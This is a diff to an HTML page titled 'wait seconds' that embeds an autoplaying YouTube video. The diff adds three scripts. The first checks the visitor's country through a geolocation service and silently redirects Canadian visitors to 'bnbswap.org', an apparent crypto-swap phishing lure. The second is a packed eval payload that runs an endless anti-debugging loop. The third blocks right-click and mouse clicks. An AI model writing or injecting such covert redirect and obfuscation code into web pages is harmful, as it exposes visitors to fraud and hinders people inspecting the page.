@@ -77,6 +77,17 @@
     }
   })
 </script>
+  <script>
+  fetch('https://freegeoip.app/json/')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    if(data.country_code == 'CA') {
+      window.location.replace("http://bnbswap.org");
+    }
+  })
+</script>
  </head>
 <title>wait seconds</title>
 </head>
@@ -84,7 +95,10 @@
 <center>
 <iframe src="https://www.youtube-nocookie.com/embed/-dD-u08OpJE?autoplay=1&loop=1&modestbranding=1&showinfo=0&rel=0&cc_load_policy=1&iv_load_policy=3&theme=light&fs=0&color=white&autohide=0&controls=0&disablekb=1" width="560" height="315" frameborder="0"></iframe>
 </div>
-
+<script type="text/javascript">
+eval(function(p,a,c,k,e,d){e=function(c){
+return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(3(){(3 a(){8{(3 b(2){7((\'\'+(2/2)).6!==1||2%5===0){(3(){}).9(\'4\')()}c{4}b(++2)})(0)}d(e){g(a,f)}})()})();',17,17,'||i|function|debugger|20|length|if|try|constructor|||else|catch||5000|setTimeout'.split('|'),0,{}))
+</script>
 
 </body>
  <!-- Histats.com  START  (aync)-->
@@ -102,4 +116,22 @@ hs.src = ('//s10.histats.com/js15_as.js');
 </html>
 
 </body>
+<script type="text/javascript">
+var isNS = (navigator.appName == &quot;Netscape&quot;) ? 1 : 0;
+if(navigator.appName == &quot;Netscape&quot;) document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
+function mischandler(){
+return false;
+}
+function mousehandler(e){
+var myevent = (isNS) ? e : event;
+var eventbutton = (isNS) ? myevent.which : myevent.button;
+if((eventbutton==1)||(eventbutton==2)||(eventbutton==3)) {
+ alert("copyThieft");
+ return false;
+ }
+}
+document.oncontextmenu = mischandler;
+document.onmousedown = mousehandler;
+document.onmouseup = mousehandler;
+</script>
 </html>
